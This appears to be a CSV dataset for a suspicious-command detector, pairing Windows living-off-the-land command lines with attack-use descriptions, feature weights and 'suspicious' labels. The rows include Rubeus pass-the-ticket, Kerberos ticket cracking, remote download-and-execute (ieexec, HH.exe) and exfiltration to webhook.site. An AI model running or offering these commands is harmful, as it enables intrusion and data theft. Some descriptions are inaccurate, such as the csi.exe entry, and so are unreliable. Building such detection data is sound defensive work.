prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
rundll32.exe syssetup.dll,"Potential use: Execute malicious code or load a malicious DLL file.
What it does: Launches the System Setup process, which can be used to install or uninstall Windows components and drivers.",rundll32.exe,syssetup.dll,none,none,none,none,none,0.45,suspicious,,
rundll32 syssetup.dll,"Potential use: Execute code from a DLL file.
What it does: Launches the Windows Setup API, which can be used to install or uninstall Windows components and updates.",rundll32 ,syssetup.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe url.dll,"Can be used to launch a URL or execute a DLL file, potentially used to download and execute malicious code.",rundll32.exe,url.dll,none,none,none,none,none,0.45,suspicious,,
rundll32.exe zipfldr.dll,"Potential use: Compress or extract files.
What it does: Opens the built-in Windows zip folder interface.",rundll32.exe,zipfldr.dll,none,none,none,none,none,0.45,suspicious,,
csi.exe file,"Potential use in a cyberattack: It can be used to analyze and collect forensic data from a Windows machine.
What it might do on a Windows machine: It will launch the Windows forensic tool, Computer System Investigation (CSI), which can collect information about running processes, network connections, and system configuration.",csi.exe,file,none,none,none,none,none,0.45,suspicious,,
Mftrace.exe cmd.exe,This command can be used to execute arbitrary commands through cmd.exe and potentially bypass security measures.,Mftrace.exe,cmd.exe,none,none,none,none,none,0.45,suspicious,,
rcsi.exe bypass.csx,This command may be used to execute a C# script that could potentially bypass security measures on a Windows machine.,rcsi.exe,bypass.csx,none,none,none,none,none,0.45,suspicious,,
rcsi.exe bypass.csx,This command may be used to execute a C# script that could potentially bypass security measures on a Windows machine.,rcsi.exe,bypass.csx,none,none,none,none,none,0.45,suspicious,,
"Remote.exe /s ""powershell.exe"" anythinghere","This command can be used to execute PowerShell commands remotely on a Windows machine, potentially allowing an attacker to execute malicious code or commands without being physically present on the machine.",Remote.exe,powershell.exe,none,none,none,/s,none,0.45,suspicious,,
"Remote.exe /s ""powershell.exe"" anythinghere","This command can be used to execute PowerShell commands remotely on a Windows machine, potentially allowing an attacker to execute malicious code or commands without being physically present on the machine.",Remote.exe,powershell.exe,none,none,none,/s,none,0.45,suspicious,,
te.exe bypass.wsc,This command can be used to execute a scriptlet file (.wsc) that can potentially bypass security measures and execute malicious code on a Windows machine.,te.exe,bypass.wsc,none,none,none,none,none,0.45,suspicious,,
SharpHound.exe,"SharpHound.exe is a tool used for Active Directory reconnaissance and can be used to gather information about users, groups, computers, and other objects in the domain.",SharpHound.exe,SharpHound.exe,none,none,none,none,none,0.45,suspicious,,
whoami /all,"Displays the security context of the current user including the security identifiers (SIDs) and group membership, which can be useful for privilege escalation and lateral movement.",none,whoami,none,none,none,/all,none,0.45,suspicious,,
winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe,"This command can be used to remotely execute the Windows calculator on a machine in the EXAMPLE.lab.local domain using the specified user credentials, potentially allowing an attacker to gain access to sensitive information or execute further commands on the compromised machine.",none,calc.exe,none,none,none,-r,none,0.50,suspicious,,
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi,This command could be used to crack passwords in a cyberattack and gain access to a Windows machine.,none,.\10k-worst-pass.txt,none,.\mssqlsvc.kirbi,none,none,none,0.50,suspicious,,
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the Administrator account using an RC4 hash of the account's NTLM password, and then inject the resulting ticket into the current user's Kerberos ticket cache for lateral movement.",none,/rc4:[NTLMHASH],none,none,none,"Rubeus.exe,asktgt,/ptt",none,0.50,suspicious,,
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the Administrator account using an AES256 hash, and can be used in a cyberattack to gain access to sensitive information on a Windows machine. The /opsec flag is used to bypass security measures, and the /ptt flag is used to execute the ticket in memory without writing to disk.",none,/aes256:[AES256HASH],none,none,none,"Rubeus.exe,asktgt,/opsec,/ptt",none,0.50,suspicious,,
bash.exe -c calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the Bash shell, potentially allowing an attacker to bypass security measures that block direct execution of calc.exe.",bash.exe,calc.exe,none,none,none,-c,none,0.55,suspicious,,
bash.exe -c calc.exe,"This command can be used to execute the Windows calculator (calc.exe) through the Bash shell, potentially allowing an attacker to bypass security measures that block direct execution of calc.exe.",bash.exe,calc.exe,none,none,none,-c,none,0.55,suspicious,,
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,"This command can be used to bypass security policies and execute the calculator program, while also sending information to a remote server.",ConfigSecurityPolicy.exe, https://webhook.site/xxxxxxxxx?encodedfile,none,C:\\\\Windows\\\\System32\\\\calc.exe ,none,none,none,0.55,suspicious,,
control.exe c:\\windows\\tasks\\file.txt:evil.dll,"This command can be used to execute a malicious DLL file from a scheduled task, allowing an attacker to maintain persistence on the compromised system.",control.rxr, c:\\windows\\tasks\\file.txt:evil.dll,none, c:\\windows\\tasks\\file.txt:evil.dll,none,none,none,0.55,suspicious,,
csc.exe -out:My.exe File.cs,"Compile C# code and create an executable file, which can be used to execute malicious code on a Windows machine.",csc.exe,"File.cs, My.exe",none,none,none,-out,none,0.55,suspicious,,
cscript c:\\ads\\file.txt:script.vbs,"This command can be used to execute a VBScript file stored in an Alternate Data Stream (ADS) of a text file, potentially allowing an attacker to hide their malicious code and evade detection.",cscript,c:\\ads\\file.txt:script.vbs,none,c:\\ads\\file.txt:script.vbs,none,none,none,0.55,suspicious,,
diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,"This command can be used to compress a file on a remote machine and transfer it to a local machine, potentially for exfiltration of sensitive data.",diantz.exe,c:\\destinationFolder\\file.cab,none,\\\\remotemachine\\pathToFile\\file.exe,none,none,none,0.55,suspicious,,
diskshadow.exe /s c:\\test\\diskshadow.txt,"This command can be used to create a shadow copy of a volume, which can be useful for backing up or accessing files that are currently in use, and could potentially be used by an attacker to access sensitive data on a Windows machine.",diskshadow.exe,c:\\test\\diskshadow.txt,none,none,none,/s,none,0.55,suspicious,,
diskshadow> exec calc.exe,"Potential use: Launching a malicious executable (in this case, the Windows calculator) using a legitimate Windows utility (diskshadow) for ""living off the land"" purposes.

What it does: Executes the Windows calculator program.",diskshadow,calc.exe,none,none,none,exec,none,0.55,suspicious,,
dllhost.exe /Processid:{CLSID},"This command can be used to execute arbitrary code within a COM surrogate process, potentially allowing an attacker to bypass application whitelisting or execute code with elevated privileges.",dllhost.exe,CLSID,none,none,none,/Processid,none,0.55,suspicious,,
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat,"This command can be used to execute a hidden batch file stored in an Alternate Data Stream (ADS) on a remote WebDAV server, allowing an attacker to run malicious code on a victim's machine without detection.",expand ,c:\\ADS\\file.bat,none,\\\\webdav\\folder\\file.bat,none,none,none,0.55,suspicious,,
expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat,"This command concatenates the contents of two batch files and saves the result in a new file, which could potentially be used to execute malicious code or commands.",expand , c:\\ADS\\file2.bat,none,c:\\ADS\\file1.bat,none,none,none,0.55,suspicious,,
expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an alternate data stream of a legitimate file, allowing an attacker to execute the malicious code while appearing to be a legitimate file.",expand ,c:\\ADS\\file.txt:file.bat,none,\\\\webdav\\folder\\file.bat,none,none,none,0.55,suspicious,,
Extexport.exe c:\\test foo bar,"Potential use in a cyberattack: Exporting data from a specified file or directory.
What it might do on a Windows machine: Export the contents of the ""test"" directory to a file named ""foo"" with a password of ""bar"".",Extexport.exe,c:\\test foo bar,none,c:\\test foo bar,none,none,none,0.55,suspicious,,
extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe,"This command can be used to extract a file from a cabinet (.cab) archive and save it to a specified location on the machine, potentially allowing an attacker to extract and execute a malicious file.",extrac32,c:\\ADS\\file.txt:procexp.exe,none,C:\\ADS\\procexp.cab,none,none,none,0.55,suspicious,,
"C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""","This command can be used to download a file from a specified URL and save it to a specified destination on a Windows machine, potentially allowing an attacker to download and execute malicious code.",GfxDownloadWrapper.exe,"""URL"",""DESTINATION FILE""",none,C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe,none,none,none,0.55,suspicious,,
HH.exe http://some.url/script.ps1,"This command can be used to execute a PowerShell script hosted on a remote server, allowing an attacker to download and run malicious code on a victim's machine.",HH.exe,http://some.url/script.ps1,none, http://some.url/script.ps1,none,none,none,0.55,suspicious,,
HH.exe c:\\windows\\system32\\calc.exe,"This command can be used to execute the Windows Calculator (calc.exe) from the command line, potentially as a way to test if a command execution vulnerability exists on the system.",HH.exe,c:\\windows\\system32\\calc.exe,none,c:\\windows\\system32\\calc.exe,none,none,none,0.55,suspicious,,
ieexec.exe http://10.10.10.10:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, potentially allowing an attacker to gain unauthorized access or control of the compromised system.",ieexec.exe,http://10.10.10.10:8080/bypass.exe,none,http://10.10.10.10:8080/bypass.exe,10.10.10.10:8080,none,none,0.55,suspicious,,
ieexec.exe http://11.11.11.11:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, allowing an attacker to gain control of the compromised machine.",ieexec.exe, http://11.11.11.11:8080/bypass.exe,none, http://11.11.11.11:8080/bypass.exe,11.11.11.11:8080,none,none,0.55,suspicious,,
